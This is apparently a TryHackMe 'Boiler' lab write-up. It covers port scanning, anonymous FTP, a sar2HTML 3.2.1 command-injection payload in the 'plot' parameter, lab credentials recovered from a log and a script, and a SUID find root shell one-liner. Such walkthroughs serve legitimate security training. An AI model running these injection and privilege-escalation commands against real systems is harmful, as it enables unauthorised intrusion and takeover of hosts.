# 🔥 Boiler — CTF Write-up

> **Platform:** TryHackMe &nbsp;|&nbsp; **Difficulty:** Medium &nbsp;|&nbsp; **Author:** [XENOS](https://github.com/obadahamed) &nbsp;|&nbsp; **Target:** `10.129.133.155`

---

## ⛓️ Attack Chain

```
Nmap → FTP Anonymous Login → Directory Enumeration
  → sar2HTML RCE → SSH (basterd) → Credential Leak
    → SSH (stoner) → SUID find → Root
```

---

## 1. Reconnaissance — Nmap

```bash
sudo nmap -sCV -O -T4 -A -Pn -p- 10.129.133.155 -oN nmap-result.nmap
```

| Port      | Service | Version       |
|-----------|---------|---------------|
| `21`      | FTP     | vsFTPd 3.0.3  |
| `80`      | HTTP    | Apache        |
| `10000`   | HTTP    | Webmin        |
| `55007`   | SSH     | OpenSSH       |

> 💡 **SSH on a non-standard port (55007)** — this is why `-p-` matters. A default scan would have missed it entirely.

---

## 2. FTP — Anonymous Login

FTP is configured to allow anonymous authentication, meaning no credentials are required.

```bash
ftp 10.129.133.155
# Username: anonymous
# Password: (empty)
```

```bash
ftp> ls -la
-rw-r--r--  1 ftp  ftp  74 Aug 21 2019 .info.txt

ftp> get .info.txt
```

```bash
cat .info.txt
# Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

This is **ROT13** encoding. Decoded:

> *"Just wanted to see if you find it. Lol. Remember: Enumeration is the key!"*

A hint, not a credential — but confirmation we are on the right track.

---

## 3. Web Enumeration

### 3.1 Gobuster — Root Directory

```bash
gobuster dir -u http://10.129.133.155 \
  -w ~/wordlists/SecLists/Discovery/Web-Content/common.txt
```

```
/joomla        (Status: 301)
/manual        (Status: 301)
/robots.txt    (Status: 200)
/server-status (Status: 403)
```

---

### 3.2 robots.txt — Decoding the Hidden Message

```
/tmp  /.ssh  /yellow  /not  /a+rabbit  /hole  /or  /is  /it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104
090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121
089 109 070 104 078 084 069 049 079 068 081 075
```

All listed directories return **404** — intentional rabbit holes.

**Decoding the number sequence step by step:**

```
Step 1 — Decimal → ASCII:
  OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK

Step 2 — Base64 → Hex:
  99b0660cd95adea327c54182baa51584

Step 3 — MD5 hash → CrackStation:
  "kidding"
```

> 🐇 Another decoy. The word *"kidding"* confirms this entire chain was a distraction designed to waste time.

---

### 3.3 Gobuster — /joomla

Joomla is a popular open-source CMS. Deeper enumeration reveals:

```bash
gobuster dir -u http://10.129.133.155/joomla \
  -w ~/wordlists/SecLists/Discovery/Web-Content/common.txt
```

```
/administrator   (Status: 301)
/_test           (Status: 301)   ← interesting
/_files          (Status: 301)
/_archive        (Status: 301)
```

---

## 4. Remote Code Execution — sar2HTML

Navigating to `/joomla/_test/` reveals a **sar2HTML v3.2.1** interface.

### Theory

sar2HTML converts Linux `sar` system activity reports into HTML graphs. In version 3.2.1, the `plot` GET parameter is passed **directly into a shell command without sanitization**, resulting in unauthenticated Remote Code Execution.

**Reference:** `searchsploit php/webapps/47204.txt`

### Exploitation

```bash
# Verify code execution
http://10.129.133.155/joomla/_test/index.php?plot=;id

# List directory contents
http://10.129.133.155/joomla/_test/index.php?plot=;ls
```

> Output appears at the bottom of the page inside the **"Select Host"** dropdown after injection.

A file named `log.txt` appears in the directory listing:

```bash
http://10.129.133.155/joomla/_test/index.php?plot=;cat%20log.txt
```

```log
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd
from 10.1.1.1 port 49824 ssh2  #pass:superduperp@$$
```

**✅ Credentials obtained:** `basterd : superduperp@$$`

---

## 5. Initial Access — SSH as basterd

```bash
ssh basterd@10.129.133.155 -p 55007
# Password: superduperp@$$
```

Enumerating the home directory reveals a backup script:

```bash
cat backup.sh
```

```bash
USER=stoner
PASS=superduperp@$$no1knows
```

**✅ Credentials obtained:** `stoner : superduperp@$$no1knows`

---

## 6. Lateral Movement — SSH as stoner

```bash
ssh stoner@10.129.133.155 -p 55007
# Password: superduperp@$$no1knows
```

```bash
stoner@Vulnerable:~$ ls -la
-rw-r--r-- 1 stoner stoner 34 Aug 21 2019 .secret

stoner@Vulnerable:~$ cat .secret
You made it till here, well done.
```

### 🚩 User Flag
```
You made it till here, well done.
```

---

## 7. Privilege Escalation — SUID `find`

### Theory

The **SUID (Set User ID)** bit allows a binary to execute with the privileges of its **owner** instead of the user running it. If a SUID binary is owned by `root`, it runs as root regardless of who executes it — making it a powerful privilege escalation vector.

### Detection

```bash
find / -perm -u=s -type f 2>/dev/null
```

`/usr/bin/find` appears in the output — directly exploitable via [GTFOBins](https://gtfobins.github.io/gtfobins/find/).

### Exploitation

```bash
find . -exec /bin/sh -p \; -quit
```

| Flag      | Purpose                                                        |
|-----------|----------------------------------------------------------------|
| `-exec`   | Executes a command on each result found by `find`              |
| `/bin/sh` | The shell to spawn                                             |
| `-p`      | Preserves the effective UID (root) — critical for privesc      |
| `\;`      | Terminates the `-exec` expression                              |
| `-quit`   | Exits after first match — prevents repeated shell spawning     |

```bash
# id
uid=1000(stoner) gid=1000(stoner) euid=0(root) groups=1000(stoner)
```

```bash
# cat /root/root.txt
It wasn't that hard, was it?
```

### 🚩 Root Flag
```
It wasn't that hard, was it?
```

---

## 📋 Key Takeaways

| # | Lesson |
|---|--------|
| 1 | Always scan **all ports** with `-p-` — critical services hide on high ports |
| 2 | Anonymous FTP is a silent information leak — check hidden files with `ls -la` |
| 3 | Decode layered encoding **step by step** before dismissing a finding as useless |
| 4 | Credentials left in **log files and shell scripts** are a classic lateral movement vector |
| 5 | SUID binaries are a reliable privesc path — always audit `find`, `python`, `vim`, `bash` |

---

<div align="center">

*Write-up by XENOS &nbsp;|&nbsp; [GitHub](https://github.com/obadahamed) &nbsp;|&nbsp; [Portfolio](https://obadahamed.github.io)*

</div>
